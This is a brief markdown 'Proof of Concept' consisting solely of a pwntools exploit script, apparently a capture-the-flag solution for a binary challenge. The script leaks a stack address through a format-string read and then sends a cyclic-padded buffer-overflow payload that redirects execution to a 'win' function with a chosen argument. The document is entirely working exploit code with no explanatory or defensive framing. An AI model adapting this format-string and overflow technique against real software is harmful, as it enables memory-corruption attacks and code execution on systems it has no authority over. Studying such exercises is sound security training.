# Proof of Concept

## TL;DR

```
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.sendline(b'%12$p')
    io.recvuntil(b'0x')
    stack = int(io.recvline().strip().decode(), 16)
    info('stack: %#x', stack)
    io.sendlineafter(b':', cyclic(30, n=4) + p32(stack) + cyclic(24) + p32(elf.sym['win']) + cyclic(4,n=4) + p32(next(elf.search(b'hwhwhw'))))
    

```